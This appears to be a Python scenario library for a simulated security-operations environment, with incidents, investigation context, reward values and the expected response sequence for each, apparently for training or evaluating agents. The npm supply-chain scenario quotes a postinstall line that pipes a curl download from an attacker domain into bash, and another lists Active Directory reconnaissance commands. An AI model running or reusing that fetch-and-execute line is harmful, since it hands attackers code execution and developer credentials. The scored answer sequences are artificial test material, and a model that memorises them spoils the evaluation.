# Copyright (c) Meta Platforms, Inc. and affiliates.
# All rights reserved.
#
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree.

"""
SOC Scenario Library — Realistic Threat Intelligence Scenarios.

Each scenario models a real-world security incident type based on:
  - MITRE ATT&CK techniques (https://attack.mitre.org)
  - Real CVE references where applicable
  - Authentic SOC analyst decision trees

Reward logic:
  - Correct terminal action     : +1.0
  - Good intermediate step      : +0.3
  - Investigate (always valid)  : +0.1 to +0.15
  - Unnecessary escalation      : -0.2
  - Wrong terminal              : -0.3
  - False positive, ignoring it : +0.8
  - False positive, overreacting: -0.3
  - Repeat action               : -0.1
"""

from typing import Any, Dict, List

SCENARIOS: List[Dict[str, Any]] = [

#EASY

    {
        "id": "easy_impossible_travel",
        "alert_type": "impossible_travel_login",
        "severity": "high",
        "difficulty": "easy",
        "initial_signals": [
            "Login from Mumbai, India at 09:00 UTC",
            "Login from Moscow, Russia at 09:47 UTC (same account)",
            "Account: j.harrison@acmecorp.com",
            "Physical distance: ~6,800 km in 47 minutes (impossible)",
        ],
        "investigation_context": {
            "account_status": "active — senior finance analyst",
            "previous_travel": "no international travel in 90 days",
            "mfa_enrolled": True,
            "mfa_bypassed": False,
            "recent_phishing_target": True,
            "mitre_technique": "T1078 — Valid Accounts",
            "threat_intel": "Russia-based credential stuffing campaign active this week",
        },
        "correct_sequence": ["investigate", "block_account", "request_mfa"],
        "optimal_terminal": "block_account",
        "false_positive": False,
        "description": (
            "Impossible travel alert: two logins from geographically impossible "
            "locations within 47 minutes. Finance account is high-value target "
            "during active credential stuffing campaign."
        ),
    },

    {
        "id": "easy_false_positive_vpn",
        "alert_type": "anomalous_login_location",
        "severity": "low",
        "difficulty": "easy",
        "initial_signals": [
            "Login from Amsterdam, Netherlands (unusual country for user)",
            "Account: a.chen@acmecorp.com",
            "Login succeeded — MFA challenge passed",
            "User-agent: Chrome 124 on macOS",
        ],
        "investigation_context": {
            "vpn_exit_node": "NordVPN — Netherlands exit node",
            "user_reported_vpn_use": True,
            "mfa_enrolled": True,
            "hr_approved_travel": "Amsterdam conference — approved 2 weeks ago",
            "previous_vpn_alerts": 3,
            "asset_sensitivity": "low — marketing team member",
        },
        "correct_sequence": ["investigate", "ignore"],
        "optimal_terminal": "ignore",
        "false_positive": True,
        "description": (
            "Employee using personal VPN from approved international travel. "
            "MFA passed, HR travel record exists, user is low-risk marketing staff."
        ),
    },

    {
        "id": "easy_malware_dropper",
        "alert_type": "malware_detection",
        "severity": "critical",
        "difficulty": "easy",
        "initial_signals": [
            "EDR alert: Trojan.GenericKD.47382910 detected",
            "File: C:\\Users\\bsmith\\Downloads\\invoice_Q4_2024.exe",
            "Endpoint: WS-BSMITH-01 (Windows 11)",
            "Process tree: invoice_Q4_2024.exe → cmd.exe → powershell.exe",
        ],
        "investigation_context": {
            "file_hash_virustotal": "68/72 AV engines detect as Emotet dropper",
            "network_connections": [
                "185.220.101.47:4444 — known Emotet C2 (Abuse.ch ThreatFox)",
                "185.220.101.48:443 — secondary C2 beacon",
            ],
            "lateral_movement_detected": False,
            "user_admin_rights": True,
            "mitre_techniques": ["T1059.001 — PowerShell", "T1071.001 — Web Protocols"],
            "cve_reference": "CVE-2017-11882 (exploited in initial dropper)",
            "scheduled_tasks_created": ["WindowsUpdateHelper", "SvcHost32"],
        },
        "correct_sequence": ["isolate_device", "collect_forensics", "escalate"],
        "optimal_terminal": "isolate_device",
        "false_positive": False,
        "description": (
            "Emotet malware dropper executed on endpoint. Active C2 beacon "
            "to known malicious IPs. User has admin rights — high risk of "
            "lateral movement if not contained immediately."
        ),
    },

#MEDIUM

    {
        "id": "medium_brute_force_rdp",
        "alert_type": "brute_force_rdp",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "1,247 failed RDP login attempts in 8 minutes",
            "Source IP: 45.141.84.120 (external)",
            "Target: JUMP-SERVER-01 (internet-facing jump host)",
            "5 successful logins detected in final attempt batch",
            "Login time: 02:34 UTC (off-hours)",
        ],
        "investigation_context": {
            "source_ip_reputation": "Tor exit node — ranked #3 on Shodan attack list",
            "successful_login_user": "svc_monitoring",
            "svc_monitoring_last_used": "automated script — last used 4 months ago",
            "post_login_commands": [
                "net user /domain",
                "whoami /groups",
                "ipconfig /all",
                "net group 'Domain Admins' /domain",
            ],
            "files_accessed": [],
            "mitre_techniques": [
                "T1110.001 — Password Guessing",
                "T1021.001 — Remote Desktop Protocol",
                "T1087 — Account Discovery",
            ],
            "threat_intel": "Scattered Spider TTPs — targeting service accounts on jump hosts",
        },
        "correct_sequence": ["investigate", "block_ip", "block_account", "isolate_device"],
        "optimal_terminal": "block_ip",
        "false_positive": False,
        "description": (
            "RDP brute-force succeeded via Tor on internet-facing jump server. "
            "Attacker used dormant service account and ran AD reconnaissance commands. "
            "Scattered Spider TTP signature — nation-state adjacent threat actor."
        ),
    },

    {
        "id": "medium_insider_threat",
        "alert_type": "data_exfiltration_attempt",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "DLP alert: 6.8 GB uploaded to personal Google Drive",
            "Account: m.johnson@acmecorp.com",
            "Files tagged: CONFIDENTIAL, IP-PROTECTED",
            "Upload time: 23:47 local time (after-hours)",
            "Source: corporate laptop on VPN",
        ],
        "investigation_context": {
            "employee_status": "Resignation submitted 4 days ago — last day Friday",
            "destination_company": "Direct competitor (LinkedIn profile updated)",
            "files_exfiltrated": [
                "Q4_2025_Strategic_Roadmap.pptx",
                "Client_Pipeline_Master.xlsx (2,400 client records)",
                "Source_Code_ProductX_v3.2.zip",
                "Salary_Bands_All_Employees.xlsx",
            ],
            "previous_dlp_alerts": 0,
            "hr_offboarding_status": "IT access revocation scheduled for Friday",
            "legal_hold_required": True,
            "mitre_technique": "T1052 — Exfiltration Over Physical Medium",
        },
        "correct_sequence": ["investigate", "block_account", "collect_forensics", "escalate"],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": (
            "Departing employee exfiltrating 6.8 GB of highly sensitive IP including "
            "client data, source code, and salary information to a competitor. "
            "Legal hold required — forensics preservation is critical."
        ),
    },

    {
        "id": "medium_phishing_o365",
        "alert_type": "phishing_link_clicked",
        "severity": "medium",
        "difficulty": "medium",
        "initial_signals": [
            "Email gateway: user clicked link in quarantined phishing email",
            "URL: https://login.microsoftonline-secure.com/reset (typosquat)",
            "User: c.white@acmecorp.com (CFO executive assistant)",
            "Email subject: 'URGENT: Microsoft 365 License Expiry — Action Required'",
            "Browser: Chrome on Windows 10 — corporate managed device",
        ],
        "investigation_context": {
            "url_analysis": "AiTM (Adversary-in-the-Middle) phishing kit — EvilProxy variant",
            "session_token_stolen": "unknown — no post-auth traffic captured within 2 min",
            "mfa_enrolled": True,
            "mfa_type": "SMS OTP (downgrade from Authenticator app last week)",
            "cfo_calendar_access": True,
            "recent_wire_transfers": "CFO signed $2.1M transfer request yesterday",
            "mitre_technique": "T1557 — Adversary-in-the-Middle",
            "threat_intel": "BEC campaign targeting finance assistants — 3 companies hit this month",
        },
        "correct_sequence": ["investigate", "request_mfa", "monitor"],
        "optimal_terminal": "request_mfa",
        "false_positive": False,
        "description": (
            "CFO executive assistant clicked AiTM phishing link targeting M365 credentials. "
            "User has access to CFO calendar and finance systems. "
            "Active BEC campaign — MFA reset to Authenticator app is critical."
        ),
    },

    #HARD

    {
        "id": "hard_apt_lateral_movement",
        "alert_type": "lateral_movement_detected",
        "severity": "critical",
        "difficulty": "hard",
        "initial_signals": [
            "EDR: Pass-the-Hash attempt detected on WS04 — source WS01",
            "SIEM: Unusual SMB traffic pattern WS01→WS04→FILE-SERVER-01→DC-01",
            "EDR: LSASS memory access (credential dumping) on WS01 at 03:12 UTC",
            "AV: No detections (fileless attack — living-off-the-land)",
            "Firewall: outbound TCP/443 to 185.220.101.99 — beacon pattern (30s interval)",
        ],
        "investigation_context": {
            "c2_analysis": "Cobalt Strike beacon — malleable C2 profile mimicking Office 365 traffic",
            "c2_server": "185.220.101.99 (DigitalOcean — flagged by Mandiant threat intel)",
            "initial_access": "Spear-phishing email with ISO attachment — WS01 user 52h ago",
            "accounts_compromised": [
                "local_admin (WS01, WS04)",
                "svc_backup (domain-level service account)",
                "Domain Admin hash captured — not yet used",
            ],
            "persistence": [
                "Scheduled task: 'WindowsUpdateHelper' (WS01, WS04)",
                "Registry run key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            ],
            "exfiltration_detected": False,
            "domain_controller_reached": False,
            "mitre_techniques": [
                "T1550.002 — Pass the Hash",
                "T1003.001 — LSASS Memory",
                "T1071.001 — Web Protocols (C2)",
                "T1053.005 — Scheduled Task",
            ],
            "threat_actor": "APT29 (Cozy Bear) TTP fingerprint — 87% confidence",
        },
        "correct_sequence": [
            "investigate",
            "isolate_device",
            "block_ip",
            "collect_forensics",
            "escalate",
        ],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": (
            "Active APT29-attributed intrusion. Cobalt Strike C2 active. "
            "Lateral movement via Pass-the-Hash across 3 workstations toward DC. "
            "Domain Admin hash captured but not yet used — window to contain is closing."
        ),
    },

    {
        "id": "hard_supply_chain_npm",
        "alert_type": "suspicious_package_behavior",
        "severity": "high",
        "difficulty": "hard",
        "initial_signals": [
            "SIEM: npm package 'axios-utils' v2.3.1 spawned outbound DNS query",
            "DNS: dev-machine-14.acmecorp.com → api.telemetry-cdn[.]com (newly registered)",
            "Package installed on 22 developer machines in last 6 hours",
            "Package updated 3 days ago (previously trusted for 2 years)",
            "No CVE filed — zero-day supply chain compromise",
        ],
        "investigation_context": {
            "package_analysis": (
                "postinstall script added: "
                "curl -s https://api.telemetry-cdn[.]com/c/$(hostname|base64) | bash"
            ),
            "domain_age": "registered 5 days ago — registrar privacy shield",
            "dns_resolves_to": "104.21.45.67 (Cloudflare proxy — attacker-controlled origin)",
            "developer_machine_access": [
                "AWS production credentials in ~/.aws/credentials",
                "GitHub tokens in ~/.gitconfig and .env files",
                "Kubernetes kubeconfig with cluster-admin on prod cluster",
            ],
            "aws_cloudtrail": "No unusual API calls in last 2 hours (may be staged)",
            "github_audit_log": "No suspicious pushes detected yet",
            "npm_maintainer_status": "Account hijacked — maintainer reported 6h ago to npm",
            "affected_repos": ["product-api", "payment-service", "auth-service"],
            "mitre_techniques": [
                "T1195.001 — Compromise Software Supply Chain",
                "T1552.001 — Credentials In Files",
            ],
        },
        "correct_sequence": [
            "investigate",
            "patch_system",
            "collect_forensics",
            "monitor",
            "escalate",
        ],
        "optimal_terminal": "patch_system",
        "false_positive": False,
        "description": (
            "Hijacked npm package on 22 developer machines with access to AWS prod, "
            "GitHub tokens, and k8s cluster-admin. Postinstall script beacons to "
            "attacker-controlled domain. No exfil detected yet — 6-hour window to remediate."
        ),
    },

    {
        "id": "hard_authorized_scanner",
        "alert_type": "port_scan_detected",
        "severity": "medium",
        "difficulty": "hard",
        "initial_signals": [
            "IDS: Internal port scan — 10.0.5.22 scanning 10.0.0.0/16",
            "2,847 ports probed in 45 seconds",
            "Ports targeted: 22, 80, 443, 3389, 5432, 27017, 6379",
            "Source: internal corporate network segment",
            "No firewall blocks applied (internal traffic policy)",
        ],
        "investigation_context": {
            "source_host": "IT-INFRA-SCANNER-01 (Tenable Nessus vulnerability scanner)",
            "scan_schedule": "Weekly Tuesday 02:00–04:00 UTC — automated compliance scan",
            "scan_owner": "security-team@acmecorp.com",
            "change_management": "CHG-4821 — approved, signed off by CISO",
            "current_time": "Tuesday 02:17 UTC",
            "previous_scans": "47 identical scans in past year — all authorized",
            "false_positive_note": "IDS rule updated last week — now alerts on internal scans",
        },
        "correct_sequence": ["investigate", "ignore"],
        "optimal_terminal": "ignore",
        "false_positive": True,
        "description": (
            "Authorized Tenable Nessus compliance scan triggering newly updated IDS rule. "
            "Change management ticket approved, scheduled maintenance window, known scanner host. "
            "Classic false positive from IDS rule change without scanner whitelist update."
        ),
    },

#CRITICAL (bonus task)

    {
        "id": "critical_ransomware_precursor",
        "alert_type": "ransomware_precursor_activity",
        "severity": "critical",
        "difficulty": "hard",
        "initial_signals": [
            "EDR: Mass file enumeration — 847,000 files listed in 3 minutes on FILE-SERVER-01",
            "EDR: Volume Shadow Copy deletion attempt blocked by EDR on FILE-SERVER-01",
            "SIEM: 4 domain admin accounts logged in simultaneously from same source IP",
            "NetFlow: 12 GB outbound transfer to 91.217.137.44 (unknown) over last 2 hours",
            "EDR: Windows Defender disabled via Group Policy on 34 endpoints",
        ],
        "investigation_context": {
            "threat_classification": "BlackCat/ALPHV ransomware precursor — T-minus 2-4 hours to encryption",
            "compromised_accounts": [
                "Domain Admin × 4 (all compromised via credential stuffing)",
                "Enterprise Admin × 1",
            ],
            "exfil_destination": "91.217.137.44 — BlackCat exfil server (FBI advisory issued yesterday)",
            "affected_systems": "34 endpoints with AV disabled, 6 servers with shadow copies deleted",
            "backup_status": "Offsite backups — last snapshot 18 hours ago",
            "ransom_note_found": False,
            "encryption_started": False,
            "time_to_impact": "Estimated 2-4 hours before encryption begins",
            "mitre_techniques": [
                "T1486 — Data Encrypted for Impact",
                "T1490 — Inhibit System Recovery",
                "T1003 — OS Credential Dumping",
                "T1048 — Exfiltration Over Alternative Protocol",
            ],
        },
        "correct_sequence": [
            "investigate",
            "isolate_device",
            "block_ip",
            "collect_forensics",
            "escalate",
        ],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": (
            "BlackCat ransomware pre-encryption stage. Shadow copies deleted, AV disabled on 34 "
            "endpoints, 12 GB already exfiltrated. 4 domain admin accounts compromised. "
            "2-4 hour window before encryption — this is a P0 incident requiring immediate IR team activation."
        ),
    },
]

# Quick lookup by difficulty
EASY_SCENARIOS   = [s for s in SCENARIOS if s["difficulty"] == "easy"]
MEDIUM_SCENARIOS = [s for s in SCENARIOS if s["difficulty"] == "medium"]
HARD_SCENARIOS   = [s for s in SCENARIOS if s["difficulty"] == "hard"]